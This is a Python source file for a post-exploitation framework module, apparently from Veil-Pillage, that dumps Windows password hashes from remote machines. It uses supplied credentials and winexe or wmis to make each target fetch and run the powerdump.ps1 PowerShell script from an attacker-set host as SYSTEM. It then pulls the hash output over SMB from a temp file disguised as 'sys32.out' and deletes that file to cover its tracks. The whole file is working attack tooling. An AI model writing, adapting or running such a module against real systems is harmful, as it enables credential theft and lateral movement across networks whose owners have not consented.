"""

Dumps credentials using powershell host/invoke of 
Dave Kennedy's powerdump.ps1 script

You will likely need to use winexe for this as it runs as system,
which is needed for proper access to hives needed.

Module built by @harmj0y

"""

import time

import settings
from lib import delivery_methods
from lib import helpers
from lib import smb


class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Powerdump"
        self.description = "Dump credentials using powershell/hostexecute of the powerdump.ps1 script"

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    :   ["winexe", "[wmis] or [winexe] for triggering"],
                                    "use_ssl"           :   ["false", "use https for hosting"],
                                    "delay"             :   ["3", "delay (in seconds) before grabbing the results file"],
                                    "lhost"             :   ["", "lhost for hosting"]}

    def run(self):

        allHashes = []

        # assume single set of credentials for this module
        username, password = self.creds[0]

        use_ssl = self.required_options["use_ssl"][0]
        lhost = self.required_options["lhost"][0]
        triggerMethod = self.required_options["trigger_method"][0]
        delay = self.required_options["delay"][0]

        # the temporary output file powerdump will write to
        outFile = "C:\\Windows\\Temp\\sys32.out"

        # path to the PowerSploit Invoke-Mimikatz.ps1 powershell script
        secondStagePath = settings.VEIL_PILLAGE_PATH+"/data/misc/powerdump.ps1"

        # execute the host/trigger command with all the targets
        delivery_methods.powershellHostTrigger(self.targets, username, password, secondStagePath, lhost, triggerMethod=triggerMethod, outFile=outFile, ssl=use_ssl)

        print "\n [*] Waiting "+delay+"s for powerdump to run..."
        time.sleep(int(delay))

        for target in self.targets:

            # grab the output file and delete it
            out = smb.getFile(target, username, password, outFile, delete=True)
            if out != "":
                self.output += "[*] powerdump results using creds '"+username+":"+password+"' on "+target+" :\n"
                # self.output += out + "\n"

                # parse the powerdump output
                hashes = helpers.parseHashdump(out)
                allHashes.extend(hashes)
                
                self.output += "\n".join(allHashes)

            else:
                self.output += "[!] powerdump failed using creds '"+username+":"+password+"' on "+target+" : no result file\n"

        if len(allHashes) > 0:
            allHashes = sorted(set(allHashes))
            self.output += "\n[*] All unique hashes:\n" + "\n".join(allHashes) + "\n"
